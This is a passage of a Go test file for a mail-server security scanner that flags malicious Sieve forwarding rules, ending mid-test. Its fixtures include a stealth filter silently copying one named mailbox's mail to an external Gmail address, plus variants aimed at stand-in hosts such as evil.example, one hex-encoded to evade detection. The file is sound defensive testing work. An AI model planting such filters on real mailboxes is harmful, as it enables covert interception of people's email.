package checks

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
)

// The dovecot/Roundcube sieve script that let aura@lifecont.ro be intercepted
// for a year: forward every message to an external dropbox while :copy keeps a
// local copy so the victim never notices. This is the active exfil path that
// the Exim-filter-only audit missed.
const sieveAuraStealth = `require ["copy"];
# rule:[Forwarding]
if true
{
	redirect :copy "frontdesk.officer04@gmail.com";
}
`

func scoreSieve(t *testing.T, content string, mb filterMailbox, localDomains map[string]bool, known []string) []filterFinding {
	t.Helper()
	rules := parseSieveFilter(content)
	return scoreFilterRules(rules, mb, localDomains, known)
}

func TestParseSieveRedirectCopyIsStealthExfil(t *testing.T) {
	mb := filterMailbox{localPart: "aura", domain: "lifecont.ro"}
	got := scoreSieve(t, sieveAuraStealth, mb, map[string]bool{"lifecont.ro": true}, nil)
	if len(got) != 1 {
		t.Fatalf("len(findings) = %d, want 1: %+v", len(got), got)
	}
	f := got[0]
	if f.check != "email_filter_exfil" || f.severity != alert.Critical {
		t.Fatalf("finding = %+v, want email_filter_exfil/Critical", f)
	}
	if f.dest != "frontdesk.officer04@gmail.com" {
		t.Errorf("dest = %q, want the external dropbox", f.dest)
	}
	if !strings.Contains(f.reason, "copies every message") {
		t.Errorf("reason = %q, want stealth-copy wording", f.reason)
	}
}

func TestParseSieveKnownCopyForwardIsSuppressed(t *testing.T) {
	mb := filterMailbox{localPart: "assistant", domain: "example.com"}
	known := []string{"assistant@example.com: partner@external.example"}
	body := `if true { redirect :copy "partner@external.example"; }`
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, known)
	if len(got) != 0 {
		t.Fatalf("expected copy-forward produced findings: %+v", got)
	}
}

func TestParseSieveKnownForwarderDoesNotSuppressExplicitStealth(t *testing.T) {
	mb := filterMailbox{localPart: "assistant", domain: "example.com"}
	known := []string{"assistant@example.com: partner@external.example"}
	body := `if header :contains "subject" "invoice" {
	redirect "partner@external.example";
	keep;
}`
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, known)
	if len(got) != 1 || got[0].kind != "exfil" || got[0].severity != alert.Critical {
		t.Fatalf("explicit stealth was suppressed: %+v", got)
	}
}

func TestParseSieveKnownCopyDoesNotSuppressDiscard(t *testing.T) {
	mb := filterMailbox{localPart: "assistant", domain: "example.com"}
	known := []string{"assistant@example.com: partner@external.example"}
	body := `if header :contains "subject" "invoice" {
	redirect :copy "partner@external.example";
	discard;
}`
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, known)
	if len(got) != 1 || got[0].kind != "exfil" || got[0].severity != alert.Critical {
		t.Fatalf("copy-and-discard interception was suppressed: %+v", got)
	}
}

func TestParseSievePlainUnconditionalRedirectIsExfil(t *testing.T) {
	// redirect without :copy cancels the implicit keep, but forwarding ALL mail
	// externally is still a mailbox takeover, not a benign selective forward.
	body := `if true
{
	redirect "attacker@evil.example";
}
`
	mb := filterMailbox{localPart: "sales", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].check != "email_filter_exfil" || got[0].severity != alert.Critical {
		t.Fatalf("findings = %+v, want one email_filter_exfil/Critical", got)
	}
}

func TestParseSieveRestrictiveRedirectNoCopyIsForwarder(t *testing.T) {
	// A selective forward (only invoices) with no local copy is the plain
	// forwarder tier: High and newness-gated, not an inherent interception.
	body := `require ["fileinto"];
# rule:[fwd]
if header :contains "subject" "invoice"
{
	redirect "billing@partner.example";
}
`
	mb := filterMailbox{localPart: "office", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 {
		t.Fatalf("len(findings) = %d, want 1: %+v", len(got), got)
	}
	if got[0].check != "email_filter_forwarder" || got[0].severity != alert.High || !got[0].onlyIfNew {
		t.Fatalf("finding = %+v, want email_filter_forwarder/High/onlyIfNew", got[0])
	}
}

func TestParseSieveExplicitKeepIsStealthExfil(t *testing.T) {
	// redirect + explicit keep retains a local copy: stealth interception even
	// under a restrictive condition.
	body := `if header :contains "subject" "wire"
{
	redirect "drop@evil.example";
	keep;
}
`
	mb := filterMailbox{localPart: "cfo", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].check != "email_filter_exfil" || got[0].severity != alert.Critical {
		t.Fatalf("findings = %+v, want one email_filter_exfil/Critical", got)
	}
}

func TestParseSieveFileintoIsStealthExfil(t *testing.T) {
	body := `require ["fileinto"];
if header :contains "subject" "wire"
{
	redirect "drop@evil.example";
	fileinto "Archive";
}
`
	mb := filterMailbox{localPart: "cfo", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].check != "email_filter_exfil" || got[0].severity != alert.Critical {
		t.Fatalf("findings = %+v, want one email_filter_exfil/Critical", got)
	}
}

func TestParseSieveRedirectDiscardHidesLocalCopy(t *testing.T) {
	// redirect + discard forwards externally and drops the local copy: the
	// blackhole variant of interception.
	body := `if true
{
	redirect "drop@evil.example";
	discard;
}
`
	mb := filterMailbox{localPart: "aura", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].check != "email_filter_exfil" || got[0].severity != alert.Critical {
		t.Fatalf("findings = %+v, want one email_filter_exfil/Critical", got)
	}
	if !strings.Contains(got[0].reason, "discards the local copy") {
		t.Errorf("reason = %q, want discard-to-hide wording", got[0].reason)
	}
}

func TestParseSieveUnconditionalDiscardIsBlackhole(t *testing.T) {
	mb := filterMailbox{localPart: "aura", domain: "example.com"}
	got := scoreSieve(t, `if true { discard; }`, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].check != "email_filter_blackhole" || got[0].severity != alert.High {
		t.Fatalf("unconditional discard findings = %+v, want one High blackhole", got)
	}

	got = scoreSieve(t, `if header :contains "subject" "spam" { discard; }`, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 0 {
		t.Fatalf("selective discard produced blackhole findings: %+v", got)
	}
}

func TestParseSieveStopPreventsFollowingActions(t *testing.T) {
	body := `if header :contains "subject" "invoice"
{
	redirect "billing@partner.example";
	stop;
	keep;
}`
	mb := filterMailbox{localPart: "office", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].kind != "forwarder" || !got[0].onlyIfNew {
		t.Fatalf("actions after stop affected scoring: %+v", got)
	}
}

func TestParseSieveConditionalStopMakesFollowingRedirectSelective(t *testing.T) {
	body := `if header :contains "subject" "internal"
{
	stop;
}
redirect "archive@external.example";
`
	mb := filterMailbox{localPart: "office", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].kind != "forwarder" || !got[0].onlyIfNew {
		t.Fatalf("redirect after conditional stop was scored as unconditional: %+v", got)
	}
}

func TestParseSieveAllBranchesStopMakesFollowingActionUnreachable(t *testing.T) {
	body := `if header :contains "subject" "internal" {
	stop;
} else {
	stop;
}
redirect "archive@external.example";
`
	mb := filterMailbox{localPart: "office", domain: "example.com"}
	if got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil); len(got) != 0 {
		t.Fatalf("unreachable redirect after stopping branch chain produced findings: %+v", got)
	}
}

func TestParseSieveNestedStopsMakeFollowingActionUnreachable(t *testing.T) {
	body := `if true {
	if header :contains "subject" "internal" { stop; }
	else { stop; }
}
redirect "archive@external.example";
`
	mb := filterMailbox{localPart: "office", domain: "example.com"}
	if got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil); len(got) != 0 {
		t.Fatalf("redirect after nested stopping chain produced findings: %+v", got)
	}
}

func TestParseSieveRedirectBeforeConditionalStopStillMatchesAll(t *testing.T) {
	body := `redirect "archive@external.example";
if header :contains "subject" "internal" {
	stop;
}`
	mb := filterMailbox{localPart: "office", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].kind != "exfil" || got[0].severity != alert.Critical {
		t.Fatalf("redirect before conditional stop lost match-all scoring: %+v", got)
	}
}

func TestParseSieveIgnoresInvalidUnterminatedAction(t *testing.T) {
	body := `if true { redirect :copy "attacker@evil.example" }`
	mb := filterMailbox{localPart: "u", domain: "example.com"}
	if got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil); len(got) != 0 {
		t.Fatalf("invalid unterminated action produced findings: %+v", got)
	}
}

func TestParseSieveInvalidFileintoDoesNotInventLocalCopy(t *testing.T) {
	body := `if header :contains "subject" "invoice"
{
	redirect "billing@partner.example";
	fileinto;
}`
	mb := filterMailbox{localPart: "office", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].kind != "forwarder" || !got[0].onlyIfNew {
		t.Fatalf("invalid fileinto invented stealth delivery: %+v", got)
	}
}

func TestParseSieveSameDomainRedirectIgnored(t *testing.T) {
	// contact@franchisebucharest.com -> florin@franchisebucharest.com: a legit
	// same-domain copy-forward, not an external exfil.
	body := `# rule:[Forwarding]
if true
{
	redirect :copy "florin@example.com";
}
`
	mb := filterMailbox{localPart: "contact", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 0 {
		t.Fatalf("same-domain copy-forward produced findings: %+v", got)
	}
}

func TestParseSieveSameDomainNamedRedirectIgnored(t *testing.T) {
	body := `if true { redirect :copy "Local Partner <florin@example.com>"; }`
	mb := filterMailbox{localPart: "contact", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 0 {
		t.Fatalf("same-domain named redirect produced findings: %+v", got)
	}
}

func TestParseSieveDecodesExternalRedirectAddress(t *testing.T) {
	body := `require ["copy", "encoded-character"];
if true { redirect :copy "drop${hex:40}evil.example"; }`
	mb := filterMailbox{localPart: "contact", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].kind != "exfil" || got[0].dest != "drop@evil.example" {
		t.Fatalf("encoded external redirect escaped detection: %+v", got)
	}
}

func TestParseSieveIgnoresComments(t *testing.T) {
	// Block and line comments must not swallow the redirect or its :copy tag.
	body := `/* multi
line comment with redirect "decoy@evil.example"; inside */
require ["copy"]; # trailing comment
if true
{
	# inner comment
	redirect :copy "real@evil.example";
}
`
	mb := filterMailbox{localPart: "u", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].dest != "real@evil.example" {
		t.Fatalf("findings = %+v, want single finding for real@evil.example", got)
	}
}

func TestParseSieveTreatsMultilineStringsAsOpaque(t *testing.T) {
	body := `require ["vacation"];
vacation text:
This prose mentions redirect :copy "decoy@evil.example";
.
;
`
	mb := filterMailbox{localPart: "u", domain: "example.com"}
	if got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil); len(got) != 0 {
		t.Fatalf("action-like vacation prose produced findings: %+v", got)
	}
}

func TestParseSieveNestedIfInheritsLocalCopy(t *testing.T) {
	// An outer keep plus an inner-branch redirect still pairs into stealth.
	body := `if header :contains "from" "boss@example.com"
{
	keep;
	if header :contains "subject" "wire"
	{
		redirect "drop@evil.example";
	}
}
`
	mb := filterMailbox{localPart: "cfo", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].check != "email_filter_exfil" {
		t.Fatalf("findings = %+v, want stealth exfil from inherited keep", got)
	}
}

func TestSieveTestMatchesAll(t *testing.T) {
	tests := []struct {
		name string
		test string
		want bool
	}{
		{"true", "true", true},
		{"false", "false", false},
		{"anyof true", `anyof (true, header :contains "subject" "x")`, true},
		{"allof true and match-all", `allof (true, header :contains "from" "@")`, true},
		{"allof with restriction", `allof (true, header :contains "subject" "invoice")`, false},
		{"anyof with match-all", `anyof (header :contains "subject" "invoice", header :contains "from" "@")`, true},
		{"header contains at", `header :contains "from" "@"`, true},
		{"header contains empty", `header :contains "from" ""`, true},
		{"address contains at", `address :all :contains "from" "@"`, true},
		{"address localpart contains at", `address :localpart :contains "from" "@"`, false},
		{"address localpart wildcard", `address :localpart :matches "from" "*"`, true},
		{"header list key", `header :contains ["subject", "from"] ["invoice", "@"]`, true},
		{"indexed from not universal", `header :index 2 :contains "from" "@"`, false},
		{"MIME-scoped from not universal", `header :mime :contains "from" "@"`, false},
		{"restrictive subject", `header :contains "subject" "invoice"`, false},
		{"subject contains at", `header :contains "subject" "@"`, false},
		{"is is not wildcard", `header :is "from" "*@*"`, false},
		{"negated", `not header :contains "subject" "x"`, false},
		{"negated match-all", `not header :contains "from" "@"`, false},
	}
	for _, tt := range tests {
		got := sieveTestMatchesAll(tokenizeSieve(tt.test))
		if got != tt.want {
			t.Errorf("sieveTestMatchesAll(%q) = %v, want %v", tt.test, got, tt.want)
		}
	}
}

func TestParseSieveBranchReachability(t *testing.T) {
	mb := filterMailbox{localPart: "u", domain: "example.com"}
	local := map[string]bool{"example.com": true}

	if got := scoreSieve(t, `if false { redirect "drop@evil.example"; }`, mb, local, nil); len(got) != 0 {
		t.Fatalf("unreachable false branch produced findings: %+v", got)
	}
	got := scoreSieve(t, `if false { keep; } elsif true { redirect "drop@evil.example"; }`, mb, local, nil)
	if len(got) != 1 || got[0].kind != "exfil" || got[0].severity != alert.Critical {
		t.Fatalf("always-reached elsif was not match-all: %+v", got)
	}
	if got := scoreSieve(t, `if true { keep; } else { redirect "drop@evil.example"; }`, mb, local, nil); len(got) != 0 {
		t.Fatalf("unreachable else branch produced findings: %+v", got)
	}
}

func TestParseSieveDeepNestingTerminates(t *testing.T) {
	body := "keep;" + strings.Repeat(`if header :contains "subject" "invoice" {`, 2000) +
		`redirect "drop@evil.example";` + strings.Repeat("}", 2000)
	mb := filterMailbox{localPart: "u", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].kind != "exfil" {
		t.Fatalf("deep nesting lost inherited keep: %+v", got)
	}
}

func TestMailboxFromSievePath(t *testing.T) {
	tests := []struct {
		path string
		mb   filterMailbox
	}{
		{"/home/u/mail/example.com/aura/sieve/roundcube.sieve", filterMailbox{localPart: "aura", domain: "example.com"}},
		{"/home/u/mail/example.com/aura/.dovecot.sieve", filterMailbox{localPart: "aura", domain: "example.com"}},
		{"/home/mail/mail/example.com/aura/sieve/roundcube.sieve", filterMailbox{localPart: "aura", domain: "example.com"}},
	}
	for _, tt := range tests {
		if got := mailboxFromSievePath(tt.path); got != tt.mb {
			t.Errorf("mailboxFromSievePath(%q) = %+v, want %+v", tt.path, got, tt.mb)
		}
	}
}

// Integration: CheckMailFilters must scan sieve scripts under /home and flag
// the stealth-copy redirect as a non-gated critical exfil on first scan, the
// same way it treats an Exim deliver+save filter.
func TestCheckMailFiltersFlagsSieveStealthOnFirstScan(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	sievePath := "/home/lifecontro/mail/lifecont.ro/aura/sieve/roundcube.sieve"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve") {
				return []string{sievePath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{sievePath: now}),
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("lifecont.ro\n"), nil
			case sievePath:
				return []byte(sieveAuraStealth), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1: %+v", len(findings), findings)
	}
	f := findings[0]
	// This sieve is byte-identical to a legitimate owner-created forward except
	// for the destination, so a lone copy of it reports for review. The real
	// incident also planted an Exim filter, which is what makes it Critical --
	// see TestCheckMailFiltersCriticalWhenTwoMechanismsAgree.
	if f.Check != "email_filter_exfil" || f.Severity != alert.Warning {
		t.Fatalf("finding = %+v, want email_filter_exfil/Warning", f)
	}
	if f.Domain != "lifecont.ro" || f.Mailbox != "aura@lifecont.ro" {
		t.Errorf("tenant fields = domain %q mailbox %q, want lifecont.ro / aura@lifecont.ro", f.Domain, f.Mailbox)
	}
	if f.FilePath != sievePath {
		t.Errorf("FilePath = %q, want %q", f.FilePath, sievePath)
	}
}

// The Roundcube-managed .dovecot.sieve is a symlink to the sieve/ source that
// is already scanned; following both must not double-report the same mailbox.
func TestCheckMailFiltersSkipsSymlinkDovecotSieve(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	scriptPath := "/home/lifecontro/mail/lifecont.ro/aura/sieve/roundcube.sieve"
	activePath := "/home/lifecontro/mail/lifecont.ro/aura/.dovecot.sieve"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			switch pattern {
			case filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve"):
				return []string{scriptPath}, nil
			case filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve"):
				return []string{activePath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{scriptPath: now, activePath: now}),
		lstat: func(name string) (os.FileInfo, error) {
			if name == activePath {
				return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: os.ModeSymlink | 0o777, mtime: now}, nil
			}
			return &fakeFileInfoMtime{name: filepath.Base(name), mode: 0o644, mtime: now}, nil
		},
		readlink: func(name string) (string, error) {
			if name == activePath {
				return filepath.Join("sieve", "roundcube.sieve"), nil
			}
			return "", os.ErrNotExist
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("lifecont.ro\n"), nil
			case scriptPath, activePath:
				return []byte(sieveAuraStealth), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1 (symlink must be de-duplicated): %+v", len(findings), findings)
	}
	if findings[0].FilePath != scriptPath {
		t.Errorf("FilePath = %q, want the real script %q", findings[0].FilePath, scriptPath)
	}
}

func TestCheckMailFiltersSymlinkDoesNotConsumeFileCap(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	scriptPath := "/home/victim/mail/example.com/box/sieve/roundcube.sieve"
	dormantPath := "/home/victim/mail/example.com/box/sieve/newer-dormant.sieve"
	activePath := "/home/victim/mail/example.com/box/.dovecot.sieve"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			switch pattern {
			case filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve"):
				return []string{scriptPath, dormantPath}, nil
			case filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve"):
				return []string{activePath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{
			scriptPath:  now.Add(-time.Hour),
			dormantPath: now,
			activePath:  now.Add(time.Minute),
		}),
		lstat: func(name string) (os.FileInfo, error) {
			if name == activePath {
				return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: os.ModeSymlink | 0o777, mtime: now}, nil
			}
			return nil, os.ErrNotExist
		},
		readlink: func(name string) (string, error) {
			if name == activePath {
				return filepath.Join("sieve", "roundcube.sieve"), nil
			}
			return "", os.ErrNotExist
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("example.com\n"), nil
			case scriptPath:
				return []byte(sieveAuraStealth), nil
			case dormantPath:
				return []byte("keep;\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	cfg.Thresholds.AccountScanMaxFiles = 1
	findings := CheckMailFilters(context.Background(), cfg, nil)
	if len(findings) != 1 || findings[0].FilePath != scriptPath {
		t.Fatalf("symlink alias crowded source out of capped scan: %+v", findings)
	}
}

func TestCheckMailFiltersScansDovecotSieveOnLstatErrorOnce(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	activePath := "/home/victim/mail/example.com/box/.dovecot.sieve"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve") {
				return []string{activePath, activePath}, nil
			}
			return nil, nil
		},
		stat:  mtimesByPath(map[string]time.Time{activePath: now}),
		lstat: func(string) (os.FileInfo, error) { return nil, os.ErrPermission },
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("example.com\n"), nil
			case activePath:
				return []byte(sieveAuraStealth), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 1 || findings[0].FilePath != activePath {
		t.Fatalf("Lstat failure skipped or duplicated active script: %+v", findings)
	}
}

func TestCheckMailFiltersScansSymlinkToUnusualTarget(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	activePath := "/home/victim/mail/example.com/box/.dovecot.sieve"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve") {
				return []string{activePath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{activePath: now}),
		lstat: func(string) (os.FileInfo, error) {
			return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: os.ModeSymlink | 0o777, mtime: now}, nil
		},
		readlink: func(string) (string, error) { return "../../outside/active.sieve", nil },
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("example.com\n"), nil
			case activePath:
				return []byte(sieveAuraStealth), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 1 || findings[0].FilePath != activePath {
		t.Fatalf("unusual active symlink target was skipped: %+v", findings)
	}
}

func TestCheckMailFiltersDoesNotDedupCrossMailboxActiveSymlink(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	scriptPath := "/home/source/mail/example.com/source/sieve/shared.sieve"
	activePath := "/home/victim/mail/example.com/victim/.dovecot.sieve"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			switch pattern {
			case filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve"):
				return []string{scriptPath}, nil
			case filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve"):
				return []string{activePath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{scriptPath: now, activePath: now}),
		lstat: func(name string) (os.FileInfo, error) {
			if name == activePath {
				return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: os.ModeSymlink | 0o777, mtime: now}, nil
			}
			return nil, os.ErrNotExist
		},
		readlink: func(name string) (string, error) {
			if name == activePath {
				return scriptPath, nil
			}
			return "", os.ErrNotExist
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("example.com\n"), nil
			case scriptPath, activePath:
				return []byte(sieveAuraStealth), nil
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	cfg.Thresholds.AccountScanMaxFiles = 1
	findings := CheckMailFilters(context.Background(), cfg, nil)
	if len(findings) != 1 || findings[0].FilePath != activePath || findings[0].Mailbox != "victim@example.com" {
		t.Fatalf("cross-mailbox active script was deduplicated or misattributed: %+v", findings)
	}
}

func TestCheckMailFiltersFlagsNewlyActivatedExistingSieve(t *testing.T) {
	db := withTestStore(t)
	if err := db.SetMetaString("email:mailfilter_last_refresh", "2026-08-12T12:00:00Z"); err != nil {
		t.Fatal(err)
	}
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	scriptPath := "/home/victim/mail/example.com/box/sieve/roundcube.sieve"
	activePath := "/home/victim/mail/example.com/box/.dovecot.sieve"
	body := `if header :contains "subject" "invoice" { redirect "partner@external.example"; }`
	if err := db.SetForwarderHash("mailsieve:"+scriptPath, sha256Hex([]byte(body))); err != nil {
		t.Fatal(err)
	}
	oldTarget := "/home/victim/mail/example.com/box/sieve/old.sieve"
	if err := db.SetForwarderHash("mailsieve-active:"+activePath, sha256Hex([]byte(oldTarget))); err != nil {
		t.Fatal(err)
	}

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			switch pattern {
			case filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve"):
				return []string{scriptPath}, nil
			case filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve"):
				return []string{activePath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{scriptPath: now}),
		lstat: func(string) (os.FileInfo, error) {
			return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: os.ModeSymlink | 0o777, mtime: now}, nil
		},
		readlink: func(string) (string, error) { return filepath.Join("sieve", "roundcube.sieve"), nil },
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("example.com\n"), nil
			case scriptPath:
				return []byte(body), nil
			}
			return nil, os.ErrNotExist
		},
	})

	previousForceAll := ForceAll
	ForceAll = true
	t.Cleanup(func() { ForceAll = previousForceAll })
	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 1 || findings[0].Check != "email_filter_forwarder" {
		t.Fatalf("newly activated existing script was not treated as new: %+v", findings)
	}
}

// A standalone .dovecot.sieve (regular file, no sieve/ source) is what an
// attacker drops directly; it must be scanned, not skipped.
func TestCheckMailFiltersScansStandaloneDovecotSieve(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	activePath := "/home/victim/mail/example.com/box/.dovecot.sieve"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve") {
				return []string{activePath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{activePath: now}),
		lstat: func(name string) (os.FileInfo, error) {
			return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: 0o644, mtime: now}, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("example.com\n"), nil
			case activePath:
				return []byte(sieveAuraStealth), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 1 || findings[0].Check != "email_filter_exfil" {
		t.Fatalf("standalone .dovecot.sieve not scanned: %+v", findings)
	}
}

func TestCheckMailFiltersAccountScanHashesSieveWithoutBaselining(t *testing.T) {
	db := withTestStore(t)
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	scriptPath := "/home/victim/mail/example.com/box/sieve/roundcube.sieve"
	body := `if header :contains "subject" "invoice" { redirect "partner@external.example"; }`

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			scoped := filepath.Join("/home", "victim", "mail", "*", "*", "sieve", "*.sieve")
			host := filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve")
			if pattern == scoped || pattern == host {
				return []string{scriptPath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{scriptPath: now}),
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("example.com\n"), nil
			case scriptPath:
				return []byte(body), nil
			}
			return nil, os.ErrNotExist
		},
	})

	ctx := ContextWithAccountScope(context.Background(), "victim")
	if findings := CheckMailFilters(ctx, &config.Config{}, nil); len(findings) != 0 {
		t.Fatalf("first account scan should establish only the file hash: %+v", findings)
	}
	if got := db.GetMetaString("email:mailfilter_last_refresh"); got != "" {
		t.Fatalf("account scan established shared baseline %q", got)
	}
	if got := db.GetMetaString("email:mailsieve_last_refresh"); got != "" {
		t.Fatalf("account scan established Sieve baseline %q", got)
	}
	oldHash, ok := db.GetForwarderHash("mailsieve:" + scriptPath)
	if !ok || oldHash != sha256Hex([]byte(body)) {
		t.Fatalf("account scan hash = %q, %v; want current Sieve hash", oldHash, ok)
	}

	body = `if header :contains "subject" "invoice" { redirect "drop@evil.example"; }`
	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 1 || findings[0].Check != "email_filter_forwarder" {
		t.Fatalf("later Sieve plant was hidden by account scan: %+v", findings)
	}
}

func TestCheckMailFiltersAccountScanBypassesHostThrottle(t *testing.T) {
	db := withTestStore(t)
	mailBaseline := time.Now().Format(time.RFC3339)
	sieveBaseline := time.Now().Add(-time.Minute).Format(time.RFC3339)
	if err := db.SetMetaString("email:mailfilter_last_refresh", mailBaseline); err != nil {
		t.Fatal(err)
	}
	if err := db.SetMetaString("email:mailsieve_last_refresh", sieveBaseline); err != nil {
		t.Fatal(err)
	}

	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	scriptPath := "/home/victim/mail/example.com/box/sieve/roundcube.sieve"
	body := `if header :contains "subject" "invoice" { redirect "drop@evil.example"; }`
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == filepath.Join("/home", "victim", "mail", "*", "*", "sieve", "*.sieve") {
				return []string{scriptPath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{scriptPath: now}),
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
